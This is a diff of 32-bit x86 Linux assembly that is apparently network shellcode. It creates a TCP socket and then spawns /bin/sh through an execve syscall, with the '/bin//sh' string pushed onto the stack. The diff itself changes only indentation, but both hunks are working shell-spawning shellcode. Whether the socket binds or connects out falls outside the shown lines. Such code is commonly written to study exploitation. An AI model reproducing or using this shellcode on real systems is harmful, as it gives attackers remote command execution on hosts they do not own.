@@ -21,8 +21,8 @@ _start:           ; linker entry point
 
   ; int socket(int domain, int type, int protocol);
   push edx         ; protocol = IPPROTO_IP (0x0)
-	push ebx         ; socket_type = SOCK_STREAM (0x1)
-	push 0x2         ; socket_family = AF_INET (0x2)
+  push ebx         ; socket_type = SOCK_STREAM (0x1)
+  push 0x2         ; socket_family = AF_INET (0x2)
   mov  ecx, esp    ; move stack pointer to ecx
   int  0x80        ; syscall (exec sys_socket)
   xchg edx, eax    ; save result (sockfd) for later usage
@@ -61,10 +61,10 @@ dup:
   ; spawn /bin/sh using execve
   ; int execve(const char *filename, char *const argv[],char *const envp[]);
   mov  al, 0x0b    ; syscall: sys_execve = 11 (mov eax, 11)
-	inc  ecx         ; argv=0
-	mov  edx, ecx    ; envp=0
-	push edx         ; terminating NULL
-	push 0x68732f2f	 ; "hs//"
-	push 0x6e69622f	 ; "nib/"
-	mov  ebx, esp    ; save pointer to filename
-	int  0x80        ; syscall: exec sys_execve
+  inc  ecx         ; argv=0
+  mov  edx, ecx    ; envp=0
+  push edx         ; terminating NULL
+  push 0x68732f2f   ; "hs//"
+  push 0x6e69622f   ; "nib/"
+  mov  ebx, esp    ; save pointer to filename
+  int  0x80        ; syscall: exec sys_execve
